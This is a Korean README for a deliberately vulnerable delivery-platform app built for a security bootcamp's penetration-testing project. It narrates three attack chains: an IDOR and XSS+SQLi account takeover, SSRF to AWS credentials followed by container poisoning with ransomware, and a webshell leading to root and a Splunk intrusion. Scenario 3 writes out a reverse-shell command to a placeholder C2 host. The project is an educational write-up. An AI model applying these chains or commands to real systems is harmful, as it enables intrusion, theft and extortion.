# HackMin — 배달 주문 서비스 플랫폼

배달의민족 스타일의 모의 배달 플랫폼으로, **SK쉴더스 루키즈 31기 최종 모의해킹 대상 시스템**입니다.
직접 구축한 서비스를 대상으로 웹·모바일·인프라·AI 챗봇 전 영역에 걸쳐 취약점 진단 및 시나리오 기반 모의해킹을 수행했습니다.

> **루키즈 31기 최종 프로젝트 1위**

---

## 기술 스택

| 구분 | 기술 |
|---|---|
| 백엔드 | Python 3.11, Django 5.0, Django REST Framework |
| 인증 | JWT (모바일) + Session (점주/관리자 웹) |
| DB | SQLite (개발) / MySQL (운영, RDS 연동) |
| 모바일 | Android (Java), Retrofit2 + OkHttp |
| 관리자/점주 웹 | Django Templates |
| 배포 | Docker + docker-compose, AWS (EC2, RDS, S3, ALB) |

---

## 프로젝트 구조

```
HackMin/
├── apps/              # Django 백엔드 앱 (계정/주문/결제/배달/챗봇 등)
├── deliver_app/       # Android 배달 앱 (Java)
├── rider_app/         # Android 라이더 앱 (Java)
├── admin_bff/         # 관리자 BFF
├── web_bff/           # 점주 웹 BFF
├── config/            # Django 설정
├── docker/            # Docker 설정
└── docs/              # 취약점 진단 및 모의해킹 보고서
    ├── pentest/       # 시나리오 기반 모의해킹 결과보고서
    ├── diagnosis/     # 영역별 취약점 진단 결과보고서
    └── presentation/  # 최종 발표자료
```

---

## 설치 및 실행

```bash
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python manage.py migrate
python manage.py seed_demo
python manage.py runserver
```

Docker:
```bash
docker-compose up --build
```

| 서비스 | 포트 | 역할 |
|---|---|---|
| `api` | `localhost:8000` | REST API 서버 |
| `web` | `localhost:8001` | 관리자/점주 웹 |

데모 계정 (비밀번호: `pw1234`): `admin` / `alice` / `bob` / `owner` / `rider`

---

## 🔴 모의해킹 및 취약점 진단

> **본 프로젝트는 보안 교육 목적으로 구축된 취약 환경입니다. 허가받지 않은 실제 서비스에 대한 공격은 불법입니다.**

### 진단 개요

| 항목 | 내용 |
|---|---|
| 주관 | SK쉴더스 루키즈 31기 |
| 기간 | 2026.07.06 ~ 2026.09.09 |
| 팀 구성 | 9인 (취약점 진단 + 모의해킹 병행) |
| 진단 영역 | 웹, 모바일(Android), 클라우드 인프라(AWS), 생성형 AI 챗봇 |
| 기준 | OWASP WSTG, OWASP MASTG, 전자금융기반시설 평가기준, OWASP LLM Top 10 2026, 2024 클라우드 보안 가이드 |
| 사용 도구 | JADX, Ghidra, Frida, Burp Suite, Garak, LinPEAS, Ligolo-ng, AWS CLI, Kali Linux |

---

### 시나리오 1 — 앱 보안기능 우회 → GPS 스푸핑 → 정산 계좌 탈취 ⭐ 담당

**공격 목표:** 라이더 앱·배달 앱의 보안 기능을 우회하고, IDOR·GPS 스푸핑·Stored XSS+SQLi를 연계하여 전체 라이더 정산 계좌를 공격자 계좌로 변조

#### STEP 1 — 정적 분석 (JADX + Ghidra)

라이더 앱(com.hackmin.connect)은 ProGuard 난독화가 적용되어 있으나, 호출 흐름 역추적으로 보안 로직을 식별했다.

| 발견 항목 | 위치 | 내용 |
|---|---|---|
| 루팅 탐지 | `LoginActivity.onCreate → v80.a → r70.c` | su 바이너리 9개 경로 + Magisk 경로 5개 체크 후 `Runtime.exit(0)` 호출 |
| SSL Pinning | `res/xml/network_security_config.xml` | SHA-256 핀 4개 설정, Burp CA 설치해도 차단되는 구조 |
| GPS Mock 탐지 | `defpackage.zv.a(Location)` | `isMock()` / `isFromMockProvider()` 결과로 서버 전송 차단 |
| IDOR | `RiderApi.java → /riders/{id}/profile` | 토큰 소유권 검증 없이 타 라이더 계좌 정보 조회 가능, 응답의 `db_info` 필드에 테이블명·컬럼명까지 노출 |
| 배달비 상한 API | `POST /api/v1/rider/fee-policy` | 관리자 권한이 아닌 일반 라이더 권한으로 플랫폼 전체 상한 변경 가능 (RBAC 미적용) |

#### STEP 2 — 동적 분석 및 보안 기능 우회 (Frida)

루팅 탐지(`v80.a`, `r70.c`), SSL Pinning(`checkServerTrusted`, `checkTrustedRecursive`), GPS Mock 탐지(`isMock`, `isFromMockProvider`) 세 가지를 Frida 후킹으로 모두 우회 → Burp Suite 평문 트래픽 확보 및 GPS 스푸핑 앱 작동 가능

#### STEP 3 — IDOR로 라이더 정보 탈취

Burp Suite Intruder로 `/riders/{id}/profile` 순차 열거 → 타 라이더 계좌번호·은행명·예금주 탈취. 응답의 `db_info` 필드로 DB 구조 확보 → 후속 SQLi 정밀도 향상에 활용

#### STEP 4 — GPS 스푸핑 + 배달비 부정 정산

1. 배달비 상한값 50,000원 → **999,999,999원으로 변조** (RBAC 미적용 API 악용)
2. GPS 스푸핑으로 배달 거리 **374.7km 조작**
3. 배달 완료 처리 → **배달비 약 38만원 부정 수령 시연**

#### STEP 5~7 — Stored XSS + SQLi → 관리자 권한 → 계좌 일괄 변조

배달 앱 1:1 문의의 XSS 필터를 Frida로 우회 → Stored XSS 페이로드 삽입. 관리자 웹에서 `innerHTML`로 이스케이프 없이 렌더링 → 관리자 브라우저 컨텍스트에서 스크립트 실행. 관리자 웹 검색 파라미터(`q=`)가 Django f-string으로 SQL에 직접 삽입 → Stacked Query SQLi로 **라이더 50명 정산 계좌 전체를 공격자 계좌로 일괄 변조**

---

### 시나리오 2 — 챗봇 SSRF → IAM 자격증명 탈취 → 컨테이너 공급망 오염 → 랜섬웨어 배포

**공격 목표:** 챗봇 SSRF를 진입점으로 AWS 클라우드 권한을 탈취하고, ECR 컨테이너 이미지를 오염시켜 정상 배포 절차를 통해 서비스 전체에 랜섬웨어를 확산

#### 공격 흐름

| 단계 | 내용 |
|---|---|
| STEP 1 | 챗봇 링크 미리보기 기능으로 `http://169.254.169.254/latest/meta-data/iam/security-credentials/` 요청 → IMDSv1 적용으로 토큰 인증 없이 EC2 IAM 임시 자격증명(AccessKeyId·SecretAccessKey·Token) 탈취 |
| STEP 2 | 탈취한 자격증명으로 AWS CLI 인증 → ECR 리포지토리 접근 → 운영 환경 컨테이너 이미지 Pull |
| STEP 3 | 이미지 내부 소스코드 분석 → `os.environ`으로 주입되는 DB 접속 정보 확인 → **`.pth` 훅 메커니즘**으로 백도어(Python) + 랜섬웨어(Go) 페이로드 동시 삽입 → 오염 이미지를 기존 태그로 ECR Push하여 기존·베이스 이미지 전부 대체 |
| STEP 4 | 개발자가 정상 업데이트 배포 수행 → 오염된 이미지가 운영 환경 EC2에 자동 배포 |
| STEP 5 | 배포 약 5분 후 백도어 자동 실행 → RDS 전체 DB 덤프 후 테이블 DROP → **Tor 경유 C2 서버로 데이터 유출** |
| STEP 6 | 배포 약 7분 후 랜섬웨어 발화 → 컨테이너 파일 암호화 + 랜섬노트 생성 |
| STEP 7 | 개발자 롤백 시도 → ECR 내 모든 이미지가 이미 오염되어 **롤백 즉시 재감염, 복구 완전 무력화** |

---

### 시나리오 3 — 파일 업로드 취약점 → 웹쉘 → 권한 상승 → 내부 Splunk 침투

**공격 목표:** 리뷰 이미지 업로드 취약점으로 서버 초기 침투 후 root 권한을 획득하고, 내부망의 Splunk 보안 모니터링 인프라까지 침투하여 로그 삭제 및 지속성 확보

#### 공격 흐름

| 단계 | 내용 |
|---|---|
| STEP 1 | 리뷰 이미지 업로드 기능에서 확장자 검증만 있고 서버 측 MIME 검증 없음 확인 → PHP 웹쉘을 `.png`로 위장하여 업로드 → 점주가 리뷰 조회 시 서버에서 PHP 실행 → C2 서버로 파일 실제 경로 자동 전송 → RCE(`X-Powered-By: PHP/8.5.7`) 확인 |
| STEP 2 | 웹쉘로 `nohup bash -i >& /dev/tcp/C2_IP/4444 0>&1 &` 실행 → C2에서 `nginx(uid=997)` 권한 인터랙티브 리버스 셸 획득 |
| STEP 3 | LinPEAS로 EC2 스캔 → `root:nginx 0775` 권한의 `/opt/scripts/health_check.sh` 발견 → Cron이 1분마다 root 권한으로 실행하는 스크립트임을 확인 → SUID Bash 복사 명령 삽입 → 1분 후 `rootbash -p`로 **EUID=0(root) 획득** |
| STEP 4 | `docker inspect`로 컨테이너 환경변수에서 DB 접속 정보·AWS 액세스 키·Django 시크릿 키 등 평문 탈취 → `outputs.conf`에서 내부망 Splunk 서버 IP(`10.0.128.172`) 확인 → AWS IMDS로 SSH 키페어 이름(`hackmin-key`) 조회 → `/root/hackmin-key.pem` 발견 및 탈취 |
| STEP 5 | 탈취한 SSH 개인키로 내부망 Splunk EC2 접근 → `/etc/passwd` 수정으로 admin 비밀번호 리셋 → REST API 인증 획득 → **백도어 계정 생성 후 원본 passwd 복원으로 흔적 은닉** |
| STEP 6 | 악성 수집 스크립트 배포 → Splunk 인덱스 로그·시스템 자격증명 수집 → C2 서버로 전송 |
| STEP 7 | Splunk 인덱서 내 공격 관련 이벤트 삭제 (`\| delete`) → **systemd 타이머로 흔적 삭제 자동화** → systemd 서비스로 60초 주기 데이터 수집 자동화 → 재부팅 후에도 지속성 확보 |
| STEP 8 | **Ligolo-ng로 내부망 피벗팅** → WAS EC2를 중계 지점으로 내부 IP 대역 탐색 → 포트 포워딩으로 공격자 로컬 8000번 포트에서 내부 Splunk 웹 UI 직접 접근 확인 |

---

### 취약점 진단 요약

| 영역 | 주요 발견 취약점 |
|---|---|
| 웹 | Stored XSS, SQLi, IDOR, CSRF |
| 모바일 | 루팅 탐지 우회, SSL Pinning 우회, GPS Mock 탐지 우회, 평문 데이터 저장 |
| 인프라 | IAM 과도한 권한, IMDSv1 미적용, SSH 키페어 서버 내 노출, Cron 스크립트 권한 오설정, 컨테이너 환경변수 평문 자격증명 |
| AI 챗봇 | 간접 프롬프트 인젝션, 민감정보 노출, 과도한 권한(DB 변경), 무제한 소비(rate limit 부재) |

---

### 📄 상세 보고서

| 문서 | 링크 |
|---|---|
| 시나리오 1 결과보고서 | [docs/pentest/](docs/pentest/) |
| 시나리오 2 결과보고서 | [docs/pentest/](docs/pentest/) |
| 시나리오 3 결과보고서 | [docs/pentest/](docs/pentest/) |
| 최종 프로젝트 결과보고서 | [docs/pentest/](docs/pentest/) |
| 웹 취약점 진단 보고서 | [docs/diagnosis/](docs/diagnosis/) |
| 모바일 취약점 진단 보고서 | [docs/diagnosis/](docs/diagnosis/) |
| 인프라 취약점 진단 보고서 | [docs/diagnosis/](docs/diagnosis/) |
| 생성형 AI 취약점 진단 보고서 | [docs/diagnosis/](docs/diagnosis/) |
| 최종 발표자료 | [docs/presentation/](docs/presentation/) |

---

## 팀 정보

**SK쉴더스 루키즈 31기 5조**

| 이름 | 역할 |
|---|---|
| 김건하 | PM / 시나리오1 담당 (앱 보안기능 우회·IDOR·GPS 스푸핑·XSS+SQLi 공격 체인), 웹·모바일·인프라 진단 |
| 팀원 | 시나리오1·2·3, 웹·모바일·인프라 진단 |
